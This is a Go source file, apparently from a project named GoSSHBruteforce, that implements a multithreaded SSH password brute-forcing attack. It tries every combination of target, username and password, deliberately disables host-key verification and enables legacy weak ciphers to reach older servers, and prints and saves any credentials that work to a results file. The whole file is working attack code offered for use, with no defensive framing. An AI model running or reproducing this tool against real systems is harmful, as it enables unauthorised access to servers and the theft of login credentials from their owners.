package bruteforce

import (
    "fmt"
    "sync"
    "time"
    "strings"  // <-- TAMBAHIN INI (kalo belum ada)
    
    "golang.org/x/crypto/ssh"
    "github.com/GhostlyrootB2H/GoSSHBruteforce/internal/models"
    "github.com/GhostlyrootB2H/GoSSHBruteforce/internal/output"
    "github.com/fatih/color"
    "github.com/schollz/progressbar/v3"
)

type SSHBruteforcer struct {
    Targets     []models.Target
    Usernames   []string
    Passwords   []string
    Threads     int
    Timeout     time.Duration
    OutputFile  string
    Stats       *Stats
    Results     *output.ResultSaver
    ProgressBar *progressbar.ProgressBar
    mu          sync.Mutex
}

type Stats struct {
    Attempts    int64
    Successes   int64
    Failed      int64
    Errors      int64
    StartTime   time.Time
    mu          sync.Mutex
}

func NewSSHBruteforcer(targets []models.Target, usernames, passwords []string, threads int) *SSHBruteforcer {
    totalCombos := len(targets) * len(usernames) * len(passwords)
    
    bar := progressbar.NewOptions(totalCombos,
        progressbar.OptionSetDescription("Bruteforcing"),
        progressbar.OptionSetWriter(color.Output),
        progressbar.OptionShowCount(),
        progressbar.OptionShowIts(),
        progressbar.OptionSetTheme(progressbar.Theme{
            Saucer:        "=",
            SaucerHead:    ">",
            SaucerPadding: " ",
            BarStart:      "[",
            BarEnd:        "]",
        }))

    return &SSHBruteforcer{
        Targets:    targets,
        Usernames:  usernames,
        Passwords:  passwords,
        Threads:    threads,
        Timeout:    5 * time.Second,
        OutputFile: "results/credentials_found.txt",
        Stats:      &Stats{StartTime: time.Now()},
        Results:    output.NewResultSaver("results/credentials_found.txt"),
        ProgressBar: bar,
    }
}

func (b *SSHBruteforcer) trySSH(target models.Target, username, password string) bool {
    config := &ssh.ClientConfig{
        User: username,
        Auth: []ssh.AuthMethod{
            ssh.Password(password),
        },
        HostKeyCallback: ssh.InsecureIgnoreHostKey(),
        Timeout:         b.Timeout,
        // Add legacy algorithms for older servers
        Config: ssh.Config{
            KeyExchanges: []string{
                "diffie-hellman-group1-sha1",
                "diffie-hellman-group14-sha1",
                "diffie-hellman-group-exchange-sha1",
                "diffie-hellman-group-exchange-sha256",
                "ecdh-sha2-nistp256",
                "ecdh-sha2-nistp384",
                "ecdh-sha2-nistp521",
                "curve25519-sha256",
                "curve25519-sha256@libssh.org",
            },
            Ciphers: []string{
                "aes128-ctr",
                "aes192-ctr",
                "aes256-ctr",
                "aes128-cbc",
                "3des-cbc",
                "arcfour256",
                "arcfour128",
                "arcfour",
                "blowfish-cbc",
                "cast128-cbc",
            },
        },
    }

    addr := fmt.Sprintf("%s:%d", target.IP, target.Port)
    client, err := ssh.Dial("tcp", addr, config)
    
    if err != nil {
        // Check if it's an authentication error (good - service is up)
        if _, ok := err.(*ssh.ExitMissingError); ok {
            return false
        }
        if strings.Contains(err.Error(), "unable to authenticate") {
            return false
        }
        // Other errors (connection refused, timeout, etc.)
        return false
    }
    
    defer client.Close()
    return true
}

func (b *SSHBruteforcer) worker(targets <-chan models.Target, wg *sync.WaitGroup) {
    defer wg.Done()

    for target := range targets {
        for _, username := range b.Usernames {
            for _, password := range b.Passwords {
                b.mu.Lock()
                b.Stats.Attempts++
                b.ProgressBar.Add(1)
                b.mu.Unlock()

                // Try SSH connection
                if b.trySSH(target, username, password) {
                    b.mu.Lock()
                    b.Stats.Successes++
                    b.mu.Unlock()

                    cred := models.Credential{
                        Target:   target,
                        Username: username,
                        Password: password,
                    }

                    color.Green("\n[✓] FOUND! %s - %s:%s", target.String(), username, password)
                    b.Results.Save(cred)
                    
                    // Break password loop for this target
                    break
                }

                // Rate limiting
                time.Sleep(50 * time.Millisecond)
            }
        }
    }
}

func (b *SSHBruteforcer) Run() {
    color.Cyan("[*] Starting SSH Bruteforce Attack")
    color.Yellow("[*] Targets: %d", len(b.Targets))
    color.Yellow("[*] Usernames: %d", len(b.Usernames))
    color.Yellow("[*] Passwords: %d", len(b.Passwords))
    color.Yellow("[*] Threads: %d", b.Threads)
    color.Yellow("[*] Total combinations: %d", len(b.Targets)*len(b.Usernames)*len(b.Passwords))

    // Create channel for targets
    targetChan := make(chan models.Target, len(b.Targets))
    for _, t := range b.Targets {
        targetChan <- t
    }
    close(targetChan)

    // Start worker pool
    var wg sync.WaitGroup
    for i := 0; i < b.Threads; i++ {
        wg.Add(1)
        go b.worker(targetChan, &wg)
    }

    // Monitor stats
    go func() {
        ticker := time.NewTicker(5 * time.Second)
        defer ticker.Stop()

        for range ticker.C {
            b.mu.Lock()
            elapsed := time.Since(b.Stats.StartTime)
            rate := float64(b.Stats.Attempts) / elapsed.Seconds()
            
            color.Yellow("\n[Stats] Attempts: %d | Success: %d | Rate: %.1f/s | Elapsed: %v",
                b.Stats.Attempts, b.Stats.Successes, rate, elapsed.Round(time.Second))
            b.mu.Unlock()
        }
    }()

    wg.Wait()
    
    elapsed := time.Since(b.Stats.StartTime)
    color.Cyan("\n[*] Attack completed in %v", elapsed.Round(time.Second))
    color.Green("[✓] Total successes: %d", b.Stats.Successes)
    color.Green("[✓] Results saved to: %s", b.OutputFile)
}
